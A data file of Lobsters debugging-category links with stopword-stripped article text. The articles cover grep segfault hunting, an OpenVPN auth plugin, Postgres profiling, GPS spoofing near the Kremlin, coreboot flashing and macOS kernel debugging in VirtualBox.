bit unexpectedly set fortunately seems work around problem completely rr setting bit immediately every exec bit always set nt matter something intermittently set another day another bullet dodged
438,Lobsters,debugging,Debugging,Tracking down a segfault in grep,http://blog.loadzero.com/blog/tracking-down-a-segfault-in-grep/,tracking segfault grep,mame grep apple freebsd vagrant wunki valgrind part footnote,happily tooling around macbook command line poking around mame source code happened grep f pat listing powerpc segmentation fault record scratching sound wtf grep segfaulted grep use grep hundred time day going back year used countless script shovelled many terabyte data never failed one quintessential reliable unix tool say surprised failure understatement recovering shock felt pressing need find failed first thing first grep using file grep usrbingrep macho executable type grep grep aliased grep color grep v grep bsd grep huh bsd grep interesting also worth noting turn color default like see pattern highlighted bit playing around see could create smaller test case grep f tail pat tail listing snip normal output bunch line noise snip segmentation fault back forth bisecting input pared fairly minimal case consisted four pattern one input line xxd patssml sharc xxd listingsml grep f patssml listingsml segmentation fault debugger offer help probably wo nt since stripped binary let give whirl lldb grep f patssml listingsml current executable set grep lldb r process launched usrbingrep process exited status lldb q hmm crash head scratch realise debugger invoking color let try lldb grep color f patssml listingsml current executable set grep lldb r process launched usrbingrep process stopped thread tid libsystemplatformdylib platformmemchr queue comapplemainthread stop reason excbadaccess frame libsystemplatformdylib platformmemchr libsystemplatformdylib platformmemchr movdqa rdi pcmpeqb pmovmskb eax testl eax eax lldb bt thread tid libsystemplatformdylib platformmemchr queue comapplemainthread stop reason excbadaccess frame libsystemplatformdylib platformmemchr frame libsystemcdylib sfvwrite frame libsystemcdylib fwrite frame grep grep frame grep grep frame grep grep lldb huh yep thats segfault alright bug definitely related color stage hard figure going show bogus pointer eventually handed fwrite crash probably way original bug joy let make life bit easier see track source code apple afaict nt seem nice way match apple binary source code website binary tell u anything string grep tail snip program grep project bunch digging around apple website came empty handed time swim upstream freebsd according freebsd current stable save time looked around suitable vagrant vm image thankfully wunki done hard work wget http githubcomwunkivagrantfreebsdblobmastervagrantfile vagrant snip lot downloading configuring snip let test vagrant ssh vagrant vagrant grep color f vagrantpats vagrantlisting snip working grep hmm snip vagrant vagrant grep version grep gnu grep well interesting ship gnu grep system grep freebsd work fine greps system vagrant vagrant bsdgrep version bsdgrep bsd grep ah look closer mac version well work vagrant vagrant bsdgrep color f vagrantpats vagrantlisting vagrant vagrant vagrant vagrant echo hmm output exit code indicates match incorrect crash working properly either maybe distributed version weird let pull version port vagrant vagrant su root vagrant portsnap fetch snip root vagrant portsnap extract snip root vagrant portsnap fetch update snip vagrant vagrant cd usrportstextprocbsdgrep vagrant vagrant make snip lot compiling snip vagrant vagrant workstageusrlocalbingrep version grep bsd grep cool let try blow root vagrant workstageusrlocalbingrep color f vagrantpats vagrantlisting segmentation fault core dumped great debug build root vagrant make clean root vagrant make withdebugyes snip root vagrant gdb args workstageusrlocalbingrep color f vagrantpats vagrantlisting gnu gdb freebsd snip copyright snip gdb r starting program usrportstextprocbsdgrepworkstageusrlocalbingrep color f vagrantpats vagrantlisting program received signal sigsegv segmentation fault fastcmp typestrbyte fg icase tolower patbyte tolower strbyte current language auto currently minimal gdb bt fastcmp typestrbyte trematchfast typestrbyte trefastnexec trefastexec procline procfile vagrantlisting main sweet starting home problem let check behaviour without color vagrant vagrant workstageusrlocalbingrep f vagrantpats vagrantlisting snip working snip vagrant vagrant echo version grep showing behaviour apple version nice debuggable binary next well time get close personal source code fire point consider may need port linux since valgrind native platform let try freebsd valgrind anyway vagrant vagrant valgrind dbattachyes trackoriginsyes color f vagrantpats vagrantlisting memcheck memory error detector copyright c gnu gpl julian seward et al using libvex rerun h copyright info command color f vagrantpats vagrantlisting conditional jump move depends uninitialised value fastcmp trematchfast trefastnexec trefastexec procline procfile main uninitialised value created heap allocation malloc grepmalloc grepopen procfile main attach debugger returnnnyycc valgrind int ptracesetregs int vexguestarchstate assertion unimplemented functionality failed valgrind valgrind snip valgrind stacking snip well got halfway give u bit insight problem benefit valgrind let stop closer original error case look like read past end buffer ideally understand source code well enough prod around gdb point inspect thing unfortunately appears work freebsd thankfully quick dirty port linux go jason ubuntu bmake clean jason ubuntu bmake snip compile error snip look like main problem related fbsdid macro missing mmap stuff offmax fgetln fixing bmake little finicky building debug version hack build script jason ubuntu bmake clean jason ubuntu bmake grep buildlog jason ubuntu cat buildlog sed sed scccc g g buildsh jason ubuntu chmod ux buildsh jason ubuntu buildsh jason ubuntu file grep grep elf lsb executable version sysv dynamically linked us shared libs gnulinux buildid stripped linux version u jason ubuntu valgrind dbattachyes trackoriginsyes grep color f tmppatssml tmplistingsml memcheck memory error detector copyright c gnu gpl julian seward et al using libvex rerun h copyright info command grep color f tmppatssml tmplistingsml conditional jump move depends uninitialised value fastcmp trematchfast trefastnexec trefastexec procline procfile main uninitialised value created heap allocation malloc grepmalloc grepopen procfile main attach debugger returnnnyycc snip debugger gumf snip fastcmp typestrmbs fg icase tolower patbyte tolower strbyte gdb success replicated bug linux start debugging earnest complaining line either reading uninitialised data either patbyte strbyte gdb p gdb p patbyte gdb p strbyte gdb patbyte gdb strbyte gdb p strbyte strbyte look sus patbyte gdb bt fastcmp typestrmbs trematchfast typestrmbs trefastnexec trefastexec procline procfile tmplistingsml main gdb procline r fastexec fgpattern gdb list pmatchrmeo l len loop compare pattern pattern fgpattern pattern r fastexec fgpattern l dat pmatch eflags else r regexec rpattern l dat pmatch eflags gdb p l dat gdb p l len gdb p char l dat according fastexec operating l dat pointer line read listing file program think length match file string character without newline fastcmp wandering around offset smell like error considering listing file smaller byte look like invariant valid range fastexec access l dat l dat l len quick dig code determined access string controlled offset pmatchrmso pmatchrmeo added bit debug output clarify non color case offset color offset offset offset offset bingo offset incremented past end buffer incrementing occurs inside trefastnexec inside macro callwithoffset trematchfast preg string offset slen type nmatch pmatch eflags clear whether callee caller error intent code nt straightforward point collected enough data send bug report freebsd something still bugging though behaviour distributed bsdgrep binary different decided digging continued part footnote great treatment valgrind linux debugging general
439,Lobsters,debugging,Debugging,PostgreSQL operations that you can't EXPLAIN,http://felixge.de/2017/05/05/postgresql-operations-that-you-cant-explain.html,postgresql operation ca nt explain,http,http
440,Lobsters,debugging,Debugging,External authentication scripts in OpenVPN the right way,http://engineering.freeagent.com/2017/05/22/external-authentication-scripts-in-openvpn-the-right-way/,external authentication script openvpn right way,openvpn source code bug five year ago iptables okta authscriptopenvpn github example external script repo http wwwfreeagentcomcompanycareers,openvpn wonderfully flexible piece software anyone toolkit recently found sharp edge obvious thing work around spinning new vpn server wanted add usernamepassword authentication external source looking openvpn documentation authuserpassverify script flag provides functionality writing script easy enough read credential temporary file openvpn hand u exit appropriate exit code depending whether authentication pas fail shortly letting user loose noticed vpn kept reconnecting people occasionally packet loss observed vpn specifically looking discovered openvpn process blocked forwarding traffic time authentication script took execute soon script finished openvpn behaved expected given script talking service another node runtime super quick people would generally notice second second packet loss every time someone authenticated byte m another user start authentication vpn request timeout icmpseq request timeout icmpseq request timeout icmpseq request timeout icmpseq request timeout icmpseq authentication script completes openvpn process play catchup byte m byte m byte m byte m byte m byte m byte m byte m byte m per normal open source project promptly grabbed openvpn source code looked see howwhere auth user pas verify script called digging call tree end openvpnexecve handle calling external command intended behave like system therefore block process waiting external command return work quite well auth user pas script something quickly local node quickly becomes blocker pun intended network involved thinking must better solution suck quick searching turned bug five year ago mention c plugin api looking eventually ran across iptables okta openvpn plugins use c api shared library interact external script without blocking mind went away wrote generic plugin call external script much like authuserpassverify importantly without blocking main process whilst script run api documented openvpnpluginh really need three method implementing working plugin need amend typemask tell openvpn api call plugin wish hook case hook openvpnpluginauthuserpassverify also need define retptr handle struct plugin store context need store pointer openvpn logger path external script invoked handle api hook asked openvpn let intercept case tell openvpn going defer authentication handling write authentication result authcontrolfile worked attempt proceed also fork child process exec external script without blocking main process called openvpn exit reloads plugin intended plugin tidyup resource may also defined make sure api available plugin use generic authscriptopenvpn plugin available github script needed amending slightly instead signifying successfailure authentication attempt via exit code using deferred authentication mechanism script called openvpn generates temporary file pass path along script expected write single character file signify whether authentication succeeds fails openvpn watch file change meantime handwindow second pass point authentication attempt considered failure example let pretend wanted authenticate anyone called dave vpn could script like heavy lifting u usrbinenv ruby env username davei value success else value failure end fileopen env authcontrolfile w f fputs value end fuller featured example including comparing static challenge string please see example external script repo plugin built working script thing remains hook together make user life easier requires telling openvpn find plugin telling plugin external script invoke plugin optlocallibopenvpnpluginsauthscriptso optlocaletcopenvpnauthscript vpn traffic longer interrupted whilst user authenticating everyone happy like solving problem like looking new career challenge love hear http wwwfreeagentcomcompanycareers
441,Lobsters,debugging,Debugging,How Basic Performance Analysis Saved Us Millions,http://heap.engineering/basic-performance-analysis-saved-us-millions/,basic performance analysis saved u million,indexing data customer analytics problem unusually high cpu usage visualizing cpu use flame graph implementing fix source code additional resource,story applied basic performance analysis technique find small change resulted improvement cpu use postgres cluster save heap million dollar next year indexing data customer analytics heap customer analytics tool automatically capture every user interaction website app installed website heap automatically track every pageview click form submission owner website use heap perform many different kind aggregation different subset raw data order make possible get insight data heap let user define event term raw data example might login could defined form submission login page make analysis fast use unusual indexing strategy relies postgres partial indexing feature partial index like normal postgres index except contains row satisfy specified predicate think like regular index clause every event definition one customer creates create partial index customer raw event data restricted row match definition whenever new row inserted event table postgres automatically test event predicate partial index table add row necessary index event definition corresponding partial index make fast retrieve matching event index contains exactly event satisfy definition want learn use partial index read blog post index data go depth problem unusually high cpu usage first rolled indexing strategy cpu use significantly higher previous indexing strategy made sense thought largest customer thousand index order support filter based cs selector lot partial index contain regular expression filter thought since regular expression fairly expensive evaluate made sense testing thousand regexes every event inserted would cause postgres use ton cpu real evidence case became explanation everyone heap gave postgres used much cpu assumed fundamental tradeoff indexing strategy around october data volume continued increase started issue ingesting data coming peak hour day would take hour new event show heap dashboard completely unacceptable tool meant real time analytics instead going typical route throwing money problem thought would try hand optimizing heap ingestion throughput visualizing cpu use flame graph prior limited experience debugging performance issue googling bit came across one brendan gregg post flame graph flame graph type visualization brendan gregg invented way quickly identify part code taking cpu first step creating flame graph take sample stack process using linux perf tool perf record p pid process f g sleep sample stack given process time second second write data file called perfdata run following command brendan gregg flame graph library process file generate flame graph perf script stackcollapseperfpl outperffolded flamegraphpl outperffolded flamegraphsvg one first flame graph created postgres backend process due use connection pooling single backend process serve multiple query since vast majority query run insert flame graph postgres backend process would give u good idea cpu spent inserting event database running command pid postgres process got pgstatactivity obtained following flame graph click image open new tab click rectangle zoom hovering rectangle pull information rectangle uninitiated flame graph pretty difficult understand brendan gregg give following explanation interpret one xaxis show stack profile population sorted alphabetically passage time yaxis show stack depth rectangle represents stack frame wider frame often present stack top edge show oncpu beneath ancestry color usually significant picked randomly differentiate frame pretty clear flame graph cpu time spent execopenindices large yellow bar center right image looking flame graph tiny bit appears time split two different function buildindexinfo indexopen buildindexinfo call relationgetindexpredicate cpu time spent look like majority time spent relationgetindexpredicate looking source code relationgetindexpredicate appears purpose parse optimize partial index predicate make sense much time spent relationgetindexpredicate since parsing arbitrary expression much difficult evaluating already parsed expression let look rest time spent execopenindices remaining time spent indexopen look like indexopen call relationopen call relationidgetrelation documentation relationidgetrelation source code purpose lookup metadata different relation case mainly used looking partial index based time spent relationgetindexpredicate relationidgetrelation appears postgres spends lot time fetching parsing partial index predicate evaluating implementing fix looking source code different function significant amount caching going relationgetindexpredicate postgres first check already extracted predicate immediately return relationidgetrelation first us relationidcachelookup check relation metadata already calculated cached appears normal circumstance index metadata would fetched parsed read cache rest time unfortunately u caching work well writing event one time ten thousand different table postgres pool process us serve query process keep cache every insert assigned roundrobin amongst process inserting event one time sharded schema ten thousand underlying table unlikely two insert going table served process mean index metadata almost never cached process executing insert postgres need fetch parse index metadata destination table almost every event insert suggests simple change could make instead inserting event individually could batch insert many event going table using single command insert many event postgres would need fetch parse index metadata per batch thought batching insert reduce transaction count never save cpu resource assumed cpu going towards evaluating index predicate initial benchmark batched insert showed reduction cpu usage obtained result began testing batched insert production ultimately get improvement ingestion throughput using batch average size event ingestion latency different kafka partition looked like right deployed batching unit left hour latency able clear hour backlog minute deploying batching took another flame graph insert time appears large portion time going execqual red bar middle based source code function used evaluate partial index predicate mean postgres spending cpu actual work evaluating partial index predicate made discovery six month ago since needed add additional cpu cluster look like need next month either able find win using rudimentary performance analysis technique really take much find win way interested kind work hiring apply reach twitter additional resource
442,Lobsters,debugging,Debugging,Give me 15 minutes and I'll change your view of Linux tracing,http://www.brendangregg.com/blog/2016-12-27/linux-tracing-in-15-minutes.html,give minute change view linux tracing,youtube slideshare full talk usenix website github bccdocs give minute change view gdb full gdb example tutorial,gave demo recently usenixlisa showing ftrace perf bccbpf video youtube video part larger talk linux tracing tool using bpf superpower slide slideshare update posted full talk also usenix website apology audio typing sound effect sounded soft stage came loud recording minute demo stepped evolution recent built linux tracer ftrace many capability perf bccbpf provides final programmatic ability advanced tracing via enhanced bpf aka ebpf suspect might change people view linux tracing tracer despite built linux kernel still widely known perf bpf tutorial lisa earlier conference sasha goldshtein ran half day perf bccbpf tutorial sasha bcc contributor also experienced classroom instructor pleasure collaborate project nt videoed lab file github interested learning bccbpf also two tutorial wrote bccdocs using developing bcc tool lot interest tutorial talk imagine interest grow time people deploy linux series kernel make use bpf linux tracer resource also add tracer like systemtap lttng sysdig etc nt cover minute minute tracing demo inspired greg law excellent cppcon talk give minute change view gdb since also written gdb full gdb example tutorial lisa lot fun thanks able attend event usenix putting another great conference
443,Lobsters,debugging,Debugging,The Kremlin Eats GPS for Breakfast,https://themoscowtimes.com/articles/the-kremlin-eats-gps-for-breakfast-55823,kremlin eats gps breakfast,firsthand,past several month muscovite busy complaining social medium gpspowered mobile apps malfunctioning user yandexnavigator run frequent problem example watching vehicle location bounce map pokemon go craze arrived russia earlier year moscow geolocation issue became truly widespreadeveryone experiencing problem seems report one thing common device start going weird near kremlin center moscow earlier week popular blogger podcaster grigory bakunov better known online bobuk investigated trouble firsthand bakunov say got fed speculation happening geolocation near kremlin loaded backpack full device use gps glonass hopped segway set lap around central moscow measuring strength accuracy geolocation signalshe spent three hour rolling around kremlin starting wrapping noon cutting across city segway three hour weather quite rush bakunov recalled reason stunt another vague complaint malfunctioning geolocation bakunov mapped entire experiment able measure blue red gps glonass device succumbed locationspoofing take look map see epicenter geolocation interference somewhere inside kremlin bakunov say belief powerful transmitter operating random time inside kremlin spoofing geolocation signal frequency civilian device rely geolocation according bakunov transmitter also jamming frequency military use increased accuracy reliability bakunov device came influence spoofing transmission suddenly thought center vnukovo airport roughly kilometer southwest kremlinbakunov speculates government targeting drone quadcopters many come preprogrammed stop operating near major airportsit also possible say russian official simply wanted spoof another location moscow besides city center order deflect drone vnukovo alphabetically first airport moscow appears drone nofly listsin world bestselling dronemaker chinese technology company dji introduced geofencing technology us geolocation signal stop machine flying close airport restricted area vnukovo international airport list geofenceenabled dji drone suddenly thought approaching vnukovo would either land immediately refuse take pause geofence boundary enter airport airspacethe kremlin geolocation interference slightly le dramatic effect bakunov man wearing backpack riding segway test drone unfortunately got android device turn gps bakunov advised reader io deal
444,Lobsters,debugging,Debugging,A small website mystery,https://jvns.ca/blog/2017/05/10/a-small-website-bug-story/,small website mystery,tweeted output happen know mystery contentencoding gzip header missing http jvnsca mystery site send gzipped content even ask secret surprise gzipped content post announcing take half day fix stricttransportsecurity,hello half today website broken like debugging story thought tell one someone tweeted morning saying hey website issue kindly sent screenshot yep look like issue asked run curl http jvnsca sent output let take look http header ok date wed may gmt transferencoding chunked connection keepalive setcookie expiresthu gmt path domainjvnsca httponly etag w vary acceptencoding cfcachestatus hit expires thu may gmt cachecontrol public xcontenttypeoptions nosniff server cloudflarenginx cfray two thing notice first say etag w great clue like oh gibberish gzipped check file gzipped easiest way probably try unzip see work case gzipped data file header though ran hexdump c filetxt looked byte beginning binary data said happen know byte every gzip stream start gzipped fine though browser handle gzipped data second thing notice well something site sends gzipped data meant send contentencoding gzip header say hey content gzipped unzip displaying first mystery mystery contentencoding gzip header missing tried running curl http jvnsnfshostcom backend webhost http jvnsca us cloudflare look http header returning contentencoding gzip header header ok date thu may gmt server apache upgrade connection upgrade lastmodified tue may gmt etag acceptranges byte age vary acceptencoding contentencoding gzip contentlength contenttype texthtml also weird though might say okay say contentencoding gzip good normally order get gzipped content send acceptencoding gzip header say understand gzip sending header curl site returning gzipped content anyway weird right solved mystery found second mystery mystery site send gzipped content even ask secret surprise gzipped content could think answer second mystery though year ago felt like spending much money bandwidth wanted save money static site gzipped every page site set apache configuration rewriteengine rewritecond http acceptencoding gzip rewritecond requestfilename gz f rewriterule l tell apache hey always send gzipped reply matter solved mystery deleted htaccess file jvnsnfshostcom started behaving normally today web host nearlyfreespeech like lot automatically gzip content asked past post announcing also cleared cloudflare cache site started behaving normally think mean problem fixed maybe weird apache rule aberrant behavior causing cloudflare break somehow clear take half day fix normally something wrong cloudflare version site noncdn version site seems ok could turn cloudflare bit see fix hilariously turned stricttransportsecurity last week mean site work served http normal webhost set http yet turn cloudflare ok though page blog broken hour world end still know contentencoding gzip header went cloudflare remove webhost stop serving reason idea anyway site seems work thinkhope thought kind fun excursion http header
445,Lobsters,debugging,Debugging,Announcing debug-me,https://joeyh.name/blog/entry/announcing_debug-me/,announcing debugme,debugme short screencast demoing debugme screencast debugme chain evidence debugging email patreon devblog run one,today excited release debugme program secure remote debugging debugging problem emailircbts slow tedious hard developer need see problem understand debugme aim make debugging fast fun easy letting developer access computer remotely immediately see interact problem making problem problem get fixed fast debugme session logged signed developer gnupg key producing chain evidence saw developer good reputation leveraged make debugme secure recorded short screencast demoing debugme screencast debugme chain evidence idea debugme came debugging email patreon supporter picked debugme poll project work fun month designing evidence chain building custom efficient protocol space saving hack using websockets protocol buffer first time messing around lowlevel tty detail detail debugme development devblog anyway hope debugme make debugging le tedious back forth least time p since debugme protocol let multiple people view shell session optionally interact could us beyond debugging including live screencasting pair programming etc pps need debugme server run someone please run one
447,Lobsters,debugging,Debugging,The Science of Debugging (and Neutrinos),https://medium.com/@SteveHerrin/the-science-of-debugging-and-neutrinos-db8d116680aa,science debugging neutrino,science debugging neutrino help getting anomaly http preprint arxiv paper bad connection cable article article project leader resigning check literature experiment stackoverflow set lab apparatus opera experiment cern controlled beam hypothesis experiment iterate publish science software paper discovering something new theory final remark superconductors,science debugging neutrino help getting anomaly team us sort chat browse codingrelated site probably seen help getting error message accompanied stack trace cryptic message evidence something going wrong help getting faster light neutrino opera experiment preprint http field neutrino physic opera experiment something similar tossed preprint anomaly arxiv back observing neutrino arriving detector italy roughly nanosecond faster speed light allowthis anomaly close bug report science likely see posted preprint primarily order get input physicist physicist offer help writing paper possible cause anomalythe anomaly disappeared experiment fixed bad connection cable ended something extremely simple sure many software developer know experience unfortunate medium hype blew anomaly way proportion article article fasterthanlight neutrino ultimately contributed project leader resigningcoming physic background noticed similar experience debugging code diagnosing experimental anomaly also think time physicist spent writing paper trying explain ultimately something really dumb personally like considerate colleague time toward end like share way approaching debugging science experimentcheck literatureif pick scientific paper read past abstract notice first section typically contains summary research citing paper author usually read paper decided experiment sufficiently novel warrant writing opera preprint example mention experiment observe fasterthanlight neutrinoswith search engine resource like stackoverflow research software bug sometimes searching error turn solution instantly happens nothing novel need experiment playing around keywords often tell people seen similar problem help guide experimentsset lab apparatusthere reason lot science go lab minimizes external thing affect whatever studied lab also contains specialized apparatus let observe thing better otherwise would able opera experiment example cern provides controlled beam detector detect otherwise elusive neutrinossimilarly try set lab code buggy code part larger system try set minimal environment still allows exhibit bug thing like vms virtual environment great give control context input add instrument like debugger detailed logging let look bug easily greater detail wild lab set need build apparatus involves bringing enough relevant code data reproduce bug also need set test thing want test example research intuition suggests hypothesis particular input might problem need straightforward way manipulate input lab fortunately much easier rebuild software apparatus physical one start quickly something minimal add control hypothesis demandhypothesis experiment iteratethis heart science also useful debugging software many small experiment get done explain anomaly solve bug opera example considered thing like timedistribution neutrino beam could affect measurement similarly software usually hypothesis causing bug testusing lab set run experiment test hypothesis maybe first hypothesis wrong frequently case move next one maybe testing learn something new system lead different refined hypothesis new experiment runi keep running experiment testing hypothesis understand going ultimately science simply thing work thing understand cause something work simply making error go away enough understand caused know completely fixed circumstance might appear also know avoid coding bug futureand rare case figure maybe actually bug system experiment maybe something buried deep code way outside expertise case true anomaly least mepublishin science end result experiment paper way share whatever experiment revealed broader communityafter debugging software write paper publish result one way another example found cause bug might publish fixing putting fix code review science would paper discovering something bug due bad assumption made system publish documentation science equivalent might paper new theoryif one bug figure publish asking help hope convinced actually pretty close anomaly paper science even structure good bug report similar give context outline research done explain experimental apparatus people reproduce explain experiment done thing observed trying understand anomaly give community ability experiment try understand itfinal remarkspersonally find scientific approach debugging helpful taking iterative hypothesisandevidencebased approach help term actually getting bug solved along way often learn new thing similarly science given u sort practical thing also expanding knowledge universei mean imply approach one best one circumstance almost certainly case net productivity least short term benefit fix made without understanding put superconductors use without fully understanding work still experiment try learn odds experiment pay eventuallythe opera collaboration actually thorough trying understand anomaly releasing preprint despite project leader ended resigning many people felt embarrassed although hypedup press coverage deserves much blame finally also hope opera example reminds even smart people miss stupid bug next time publish dumb bug report please harsh
448,Lobsters,debugging,Debugging,LuaJIT to extended BPF compiler,https://gitlab.com/vavrusa/luajit-bpf,luajit extended bpf compiler,,luajit e bpf compiler read
449,Lobsters,debugging,Debugging,SessionStack demo: see how to replay user actions that led to a crash,https://youtu.be/buRN3hcfCEE,sessionstack demo see replay user action led crash,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature replaying application crash sessionstack youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature replaying application crash sessionstack youtube
452,Lobsters,debugging,Debugging,debug-me,https://joeyh.name/code/debug-me/,debugme,,
453,Lobsters,debugging,Debugging,Preventing AMI’s BIOS from interfering with coreboot flashing on the Librem 13,https://puri.sm/posts/preventing-interference-from-the-old-bios-while-flashing-coreboot/,preventing ami bios interfering coreboot flashing librem,latest post youness alaoui see recently found way trick hardware encounter chimera qubes o wrong alchemy finding alkahest last month almost always rebooting suspending machine flashing coreboot actually powering quite probably always testing new coreboot version laptop already previous version coreboot image sysrqtrigger sysrqtrigger smm turning lead gold coreboot image work situation,hardware enablement developerlatest post youness alaoui see wrote recently one collaborator tried install coreboot unfortunately bricking laptop process sent mine replacement swapped hard drive sent testing unit could investigate happened foundonce received laptop obviously wanted dump flash see went wrong cooperating external programmer setup working fine previous laptop somehow completely unable detect rom chip set figure tried everything used logic analyzer see spi data right value tried different power supply different ftdi chip different usb cable anything could think made sense whatsoever sometimes would show right data logic analyzer ftdi would see data time though looked miso pin pulled high even tried wire resistor ground order pull miso pin without luckthen four hour intense troubleshooting suddenly worked without warning done make work idea first remembered last sequence event worked suspicion defective ftdi chip using backup chip also working powered atx power supply providing motherboardi used laptop power supply turn laptop try read chip onâ knowing quite well work since motherboard would driving spi chip pin highlow thus interfering ftdi chip shut laptop removed charging cable put external power supply againi tried dump flash worked done similar manipulationsâ hundred time already whenever connected flasher rom battery removed course â external atx power supply flasher detect chip quite annoyingthen found way trick hardwareâ ftdi chip connected spi flash insert charging cable laptop second quickly remove turn power supply back suddenly ftdi detect readwrite flash chip without problem without doubt make sense joy hardware reproducible discovered trick simply thanked lord kobol offering dumped flash unbricked laptop oh yes original ftdi chip become defective switching backup one also required stepencounters chimerasbehold amicoreboot chimerainspecting flash dump surprise coreboot image corrupted strange way part old ami bios middle coreboot bios essentially chimeralet study strange creaturethe old factory bios started offset rom first rom reserved coreboot flashed old factory bios apparently moved rom offset coreboot already offset byte coreboot image region old bios somehow inserted corrupting coreboot imagei completely baffled discovery could happened thing knew collaborator flashed coreboot within qubes o installed qubes o spent time learning use figured install flashrom move coreboot image flash rebooted working fine problem qubesos brought back square one shelved problem time moved writing coreboot installation script insteadafter coreboot installation script done time betatest beyond testing team volunteered try librem sure hopped conference call operation everything going well powered brick curse well back chimera seen two chimera know real working tested least time development script todd others tried script machine powered laptop got brick retried multiple time kept getting corrupted coreboot image displaced old bios written middle making le le sense making tense wrong alchemy script already testing flashrom writing rom properly reading back ensuring would get exact hash case turning computer would get different reading corrupt image reading external flash programmer comparison left v right see left original bios image right chimera see image match offset different end change see data entirely top part also lower part mangled data matching original bios chimera wondered bug flashrom internal spi programmer would cause corruption maybe writing incorrectly somehow caching data read back flashrom verifies data wrote would give u data asked write one actually written finding alkahestas asked around irc flashrom channel â agaranâ irc nickname came rescue analyzing binary file diffs image noticed old bios data looked like nvram storage instead actual bios code suggested maybe something writing data powering laptopat moment epiphany last month almost always rebooting suspending machine flashing coreboot actually powering quite probably always testing new coreboot version laptop already previous version coreboot image conference call said power laptop somehow stuck mind testing later day subconciously using poweroff command instead reboot command made difference spent couple day testing flashed original factory bios powered flashed coreboot powered suspended rebooted depending test case probably time scenario every poweroff required flashing using external hardware flasher required charging cable trick make detect rom able confirm whenever use poweroff even using echo procsysrqtrigger flash getting corruptedif reboot pmsuspend halt force shutdown holding power button echo b procsysrqtrigger flash would get corrupted coreboot would fineno corruption happens power coreboot running happens currentlyrunning bios factory ami biosi eventually connected logic analyzer realized corruption happening linux power sequence right screen backlight turn power led turn happy written previous script analyze logic trace return command execution log showed indeed running rewriting sectorsthe best explanation far factory bios smm hook transition shut get part old bios execute verify bios setting memory still matching value rom match writes back reason data displaced offset probably bios code find nvram storage usual offset decides leave area intact instead write offset turning lead goldin theory workaround easy reboot power installing coreboot however writing install script work every librem user want foolproof possible allow sure could script startup tell people need reboot machine end script postponed reboot done part script someone prevents rebooting end shutting laptop instead sure someone bricking laptop process certainly want started looking alternative solution leave margin errorthere obvious way could find disable smm hook eventually decided simply shift coreboot image different region flash rom leaving ami bios setting area free waste bios region constrained space much better solution risking brickso coreboot image work situation whether power reboot laptop get corrupted anymore matter script still automatic reboot end make sure old bios smm hook get executed extra safety measure great way end week epic tale brought youness scientific rigor jeff homeric storytelling
454,Lobsters,debugging,Debugging,Debugging macOS Kernel using VirtualBox,https://klue.github.io/blog/2017/04/macos_kernel_debugging_vbox/,debugging macos kernel using virtualbox,hn discussion smap installing virtualbox sierra mac app store networking installing xcode mac app store install kernel debug kit kdk kdk apple developer site update nvram bootargs apple kernel programming guide apple doc modifying nvram virtualbox user manual swapping kernel protected system integrity protection sip selfcompiled kernel reliably booting recovery step sourcelevel debugging xnu source code setting lldb,update hn discussion awalton mentioned set cpuid flag vmware simply adding vmx file disable smap late last year upgraded old mbp model skylake processor debugging kernel exploit turned smap enabled inside vmware fusion vm wanted avoid dealing smap could nt figure disable fusion luckily virtualbox vms support smap yet post stepbystep guide setup macos kernel sourcelevel debugging using virtualbox though step example geared toward virtualbox guide also used setup kernel debugging vmware fusion since even straightforward fusion installing virtualbox sierra nt already macos virtualbox vm must first install target macos vm either provide vmdk vmware fusion vm create fresh vm virtualbox requires iso image install o newly created vms command used create iso sierra install app obtained mac app store hdiutil attach applicationsinstall macos sierraappcontentssharedsupportinstallesddmg noverify nobrowse mountpoint volumesinstallesd hdiutil create tmpsierra size type sparse layout spud f hfsj hdiutil attach tmpsierrasparseimage noverify nobrowse mountpoint volumesinstall asr restore source volumesinstallesdbasesystemdmg target volumesinstall noprompt noverify erase rm volumesos x base systemsysteminstallationpackages cp rp volumesinstallesdpackages volumesos x base systemsysteminstallation cp rp volumesinstallesdbasesystemdmg volumesos x base systembasesystemdmg cp rp volumesinstallesdbasesystemchunklist volumesos x base systembasesystemchunklist hdiutil detach volumesinstallesd hdiutil detach volumesos x base system hdiutil resize sector min tmpsierrasparseimage hdiutil convert tmpsierrasparseimage format udto tmpsierra rm tmpsierrasparseimage mv tmpsierracdr tmpsierraiso networking using bridged adapter nt anything special need decide go nat need enable port forwarding kdp work vm adapter setting choose advanced rightarrow port forwarding need reach debugee vm forward localhost vm installing xcode install xcode host machine easiest way install mac app store installing accepting xcode license required either opening xcode accepting command line sudo xcodebuild license accept install kernel debug kit kdk host debugger machine need install kdk apple developer site corresponding debugee macos version build guide used build kdk installs librarydeveloperkdks provides release development debug kernel macos well symbol kernel various apple kexts difference different kernel development debug kernel additional assertion error checking compared release debug build even development note debugee system need kdk installed update nvram bootargs order debug vm must set debug option bootargs nvram debugee vm numerous option addition debug use could interest including debug v always boot system verbose mode kcsuffix specifies kernel boot using given suffix pmuflags many people still seem recommend setting option however apple kernel programming guide say power management watchdog timer present earlier desktop laptop early desktop primary watchdog timer normally enabled o x server thus option nt seem anything though setting nt hurt zc zonename zc conjunction zlog log allocation free specified zone debug option allows u perform remote kernel debugging available flag listed apple doc usually use dblogpiscrn dbarp dbnmi nonmaskable interrupt nmi triggered pressing control option command shift escape triggering nmi break debugger super convenient key combo play well virtualbox cover host key combo rebound host key right command right option modifying nvram vmware fusion modify nvram using nvram command like sudo nvram bootargs v virtualbox find easy reboot nvram modification disappeared virtualbox user manual shed light currently possible manipulate efi variable within running guest eg setting bootargs variable running nvram tool mac o x guest work alternative way extradata passed vm order set bootargs variable change bootargs efi variable thus need shutdown vm run command host vboxmanage list vms take uuid use next command macos vboxmanage setextradata v swapping kernel alluded debugging different build kernel previously mentioning kcsuffix option specifies kernel build use kernel file must systemlibrarykernels debugee vm surprise directory protected system integrity protection sip therefore want use kdk kernel selfcompiled kernel must first boot recovery copy target kernel directory invalidate kext cache reboot reliably booting recovery fusion booting recovery mode using cmdr easy physical machine virtualbox hand requires step booting vm hit select boot manager rightarrow efi internal shell greeted efi shell boot recovery type comapplerecoverybootbootefi recovery gui load launch terminal move target kernel invalidate kextcache mv pathtokernelskerneldevelopment systemlibrarykernels kextcache invalidate volumesmacintosh hd reboot reboot optionally disable sip desired csrutil disable successfully disabled system integrity protection please restart machine change take effect sourcelevel debugging download xnu source code corresponding debuggee xnu version gain sourcelevel debugging lldb look librarycachescomapplexbssourcesxnuxnu kernel source either place downloaded source create symlink point source alternatively also set targetsourcemap lldb lldb setting set targetsourcemap previous 